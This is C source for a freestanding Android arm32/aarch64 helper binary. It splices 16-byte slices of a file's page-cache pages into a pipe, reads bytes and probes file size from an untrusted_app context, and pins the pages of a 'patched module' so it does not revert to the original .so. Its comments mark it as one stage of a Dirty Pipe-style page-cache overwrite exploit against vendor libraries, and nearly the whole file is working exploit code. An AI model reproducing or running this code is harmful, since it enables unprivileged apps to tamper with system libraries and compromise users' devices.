#include <syscall.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

// argv[0] = program name
// argv[1] = file offset (decimal string)
// argv[2] = file path
// argv[3] = optional "r" — read mode: write 16 bytes of file content to fd 0 (OUT_FD)
//           if absent — splice mode: splice 16 bytes of file page into fd 1 (PIPE_FD)

#define OUT_FD  0
#define PIPE_FD 1

#if defined(__arm__)
/* ---- arm32 (EABI): syscall nr in r7, args in r0-r5, svc #0 ---- */
static inline long mysyscall1(unsigned long arg0, unsigned long nr) {
    register long r0 __asm__("r0") = (long)arg0;
    register long r7 __asm__("r7") = (long)nr;
    __asm__ volatile("svc #0" : "+r"(r0) : "r"(r7) : "memory");
    return r0;
}

static inline long mysyscall3(unsigned long a0, unsigned long a1,
                              unsigned long a2, unsigned long nr) {
    register long r0 __asm__("r0") = (long)a0;
    register long r1 __asm__("r1") = (long)a1;
    register long r2 __asm__("r2") = (long)a2;
    register long r7 __asm__("r7") = (long)nr;
    __asm__ volatile("svc #0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r7) : "memory");
    return r0;
}

static inline long mysyscall6(unsigned long a0, unsigned long a1,
                              unsigned long a2, unsigned long a3,
                              unsigned long a4, unsigned long a5,
                              unsigned long nr) {
    register long r0 __asm__("r0") = (long)a0;
    register long r1 __asm__("r1") = (long)a1;
    register long r2 __asm__("r2") = (long)a2;
    register long r3 __asm__("r3") = (long)a3;
    register long r4 __asm__("r4") = (long)a4;
    register long r5 __asm__("r5") = (long)a5;
    register long r7 __asm__("r7") = (long)nr;
    __asm__ volatile("svc #0"
                     : "+r"(r0)
                     : "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5), "r"(r7)
                     : "memory");
    return r0;
}

/* Must be 8 bytes: splice()/lseek() take a loff_t*, and the kernel always
 * reads 8 bytes from that pointer. A 32-bit off_t on arm32 makes it read
 * stack garbage as the upper half and splice() fails with EINVAL. */
typedef unsigned long long off_arg_t;
#else
/* ---- aarch64: syscall nr in x8, args in x0-x5 ---- */
__attribute__((naked)) static long mysyscall1(unsigned long arg0, unsigned long nr) {
    asm volatile("mov x8, x1\nsvc 0\nret\n":::"x8");
}

__attribute__((naked)) static long mysyscall3(
    unsigned long a0, unsigned long a1, unsigned long a2, unsigned long nr) {
    asm volatile("mov x8, x3\nsvc 0\nret\n":::"x8");
}

__attribute__((naked)) static long mysyscall6(
    unsigned long a0, unsigned long a1, unsigned long a2,
    unsigned long a3, unsigned long a4, unsigned long a5, unsigned long nr) {
    asm volatile("mov x8, x6\nsvc 0\nret\n":::"x8");
}

typedef off64_t off_arg_t;
#endif

static unsigned long parse_int(char *s) {
    unsigned long val = 0;
    while (*s) { val = val * 10 + (unsigned long)(*s - '0'); s++; }
    return val;
}

static int streq(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return *a == *b;
}

void start_c(void *argblock) {
    int argc = (int)*(long *)argblock;
    char **argv = (char **)argblock + 1;

    if (argc < 3 || argc > 4)
        mysyscall1(1, __NR_exit_group);

    off_arg_t off = (off_arg_t)parse_int(argv[1]);
    char *target = argv[2];
    char *mode = (argc >= 4) ? argv[3] : (char *)0;

    int file_fd = (int)mysyscall3(
        (unsigned long)AT_FDCWD,
        (unsigned long)target,
        (unsigned long)O_RDONLY,
        __NR_openat);
    if (file_fd < 0)
        mysyscall1(4, __NR_exit_group);          /* open failed */

    if (mode && streq(mode, "P")) {
        /* Pin every page of the staged file into OUT_FD and then sleep for
         * ever. A pipe buffer holds a struct page reference, so the kernel
         * cannot reclaim the page - which is exactly what keeps the patched
         * module from turning back into the original .so under memory
         * pressure. The parent keeps the read end open; killing this process
         * (or closing both ends) releases the pages again.
         * Exit codes: 7 = nothing could be pinned. */
        off_arg_t off = 0;
        long total = 0;
        for (;;) {
            long n = mysyscall6((unsigned long)file_fd, (unsigned long)&off,
                                OUT_FD, (unsigned long)0, 65536, 0, __NR_splice);
            if (n <= 0) break;
            total += n;
            if (total >= 65536) break;
        }
        if (total <= 0)
            mysyscall1(7, __NR_exit_group);
        static const long ts[2] = { 3600, 0 };   /* aarch64 has no pause(2) */
        for (;;)
            mysyscall3((unsigned long)ts, 0, 0, __NR_nanosleep);
    }

    if (mode && streq(mode, "s")) {
        /* Size probe: lseek(SEEK_END) and return 8 bytes to OUT_FD. The target
         * vendor file cannot be stat()ed from an untrusted_app context. */
        long sz = mysyscall3((unsigned long)file_fd, 0, SEEK_END, __NR_lseek);
        unsigned long long s64 = (unsigned long long)sz;
        unsigned char out[8];
        for (int j = 0; j < 8; j++) out[j] = (unsigned char)(s64 >> (8 * j));
        long w = mysyscall3(OUT_FD, (unsigned long)out, 8, __NR_write);
        mysyscall1((unsigned long)(w == 8 ? 0 : 2), __NR_exit_group);
    }

    if (mode && streq(mode, "r")) {
        /* Read mode: lseek to offset, read 16 bytes, write to OUT_FD */
        /* Exit codes: 0=ok, 1=read<16, 2=write<16, 3=OUT_FD not a pipe (fd sanitized) */
        mysyscall3((unsigned long)file_fd, (unsigned long)off, SEEK_SET, __NR_lseek);
        unsigned char buf[16];
        long n = mysyscall3((unsigned long)file_fd, (unsigned long)buf, 16, __NR_read);
        if (n != 16)
            mysyscall1(1, __NR_exit_group);
        if (mysyscall3(OUT_FD, 0, SEEK_CUR, __NR_lseek) != (long)-29L) /* ESPIPE: fd is a pipe */
            mysyscall1(3, __NR_exit_group);
        long w = mysyscall3(OUT_FD, (unsigned long)buf, 16, __NR_write);
        mysyscall1((unsigned long)(w == 16 ? 0 : 2), __NR_exit_group);
    }

    /* Splice mode: splice 16-byte page into PIPE_FD */
    long ret = mysyscall6(
        (unsigned long)file_fd,
        (unsigned long)&off,
        PIPE_FD,
        (unsigned long)NULL,
        16,
        SPLICE_F_MOVE,
        __NR_splice);
    /* Exit codes the parent can decode:
     *   0        ok
     *   0x4x|n   splice failed, n = errno
     *   0x3x|n   short splice, n = bytes moved
     */
    if (ret == 16)
        mysyscall1(0, __NR_exit_group);
    if (ret < 0)
        mysyscall1(0x40 | (unsigned long)((-ret) & 0x3f), __NR_exit_group);
    mysyscall1(0x30 | (unsigned long)(ret & 0xf), __NR_exit_group);
}

__attribute__((naked)) void _start() {
#if defined(__arm__)
    asm(".extern start_c\nmov r0, sp\nb start_c\n");
#else
    asm(".extern start_c\nmov x0, sp\nb start_c\n");
#endif
}
